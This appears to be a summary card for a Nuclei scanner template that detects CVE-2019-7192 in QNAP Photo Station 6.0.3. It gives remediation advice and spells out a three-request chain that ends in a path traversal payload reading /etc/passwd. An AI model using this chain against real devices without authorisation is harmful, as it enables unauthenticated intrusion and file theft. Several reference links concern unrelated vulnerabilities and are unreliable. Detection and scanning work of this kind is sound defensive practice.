---
cve_id: CVE-2019-7192
template_path: nuclei-templates/http/cves/2019/CVE-2019-7192.yaml
affected_product: QNAP QTS and Photo Station
severity: critical
authentication: none
external_callback: false
affected_versions: 6.0.3
preconditions: []
poc_classification: rce
---

## Vulnerability
This improper access control vulnerability (CWE-863) in QNAP QTS and Photo Station 6.0.3 allows remote unauthenticated attackers to gain unauthorized system access. 

**Description:** This improper access control vulnerability allows remote attackers to gain unauthorized access to the system. To fix these vulnerabilities, QNAP recommend updating Photo Station to their latest versions.

**Impact:** Successful exploitation of this vulnerability allows remote attackers to execute arbitrary commands on the target system.

**Remediation:** Apply the latest security patch or upgrade to a non-vulnerable version of QNAP QTS and Photo Station.

**CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**CPE:** cpe:2.3:a:qnap:photo_station:*:*:*:*:*:*:*:*  
**EPSS:** 0.94303 (99.942 percentile)

## PoC / Detection
Classification: rce

The template executes a 3-request chain against the Photo Station API (no actual command execution or out-of-band interaction):
1. POST /photo/p/api/album.php (payload: a=setSlideshow&f=qsamplealbum) extracts `album_id` via regex `<output>([a-zA-Z]+)</output>`.
2. GET /photo/slideshow.php?album={{album_id}} extracts `access_code` via regex `encodeURIComponent\('([A-Za-z0-9]+)'\)`.
3. POST /photo/p/api/video.php (payload: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=.%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd) triggers path traversal.

Matchers confirm exploitation via 200 status, `video/subtitle` header, and regex `admin:.*:0:0:` in the final response body (proof of /etc/passwd disclosure).

## References
- https://nvd.nist.gov/vuln/detail/CVE-2019-7192
- https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html
- https://patchstack.com/database/vulnerability/all-in-one-wp-migration/wordpress-all-in-one-wp-migration-plugin-7-62-unauthenticated-reflected-cross-site-scripting-xss-vulnerability
- https://nvd.nist.gov/vuln/detail/CVE-2022-2546
- https://medium.com/@cycraft_corp/qnap-pre-auth-root-rce-affecting-312k-devices-on-the-internet-fc8af285622e
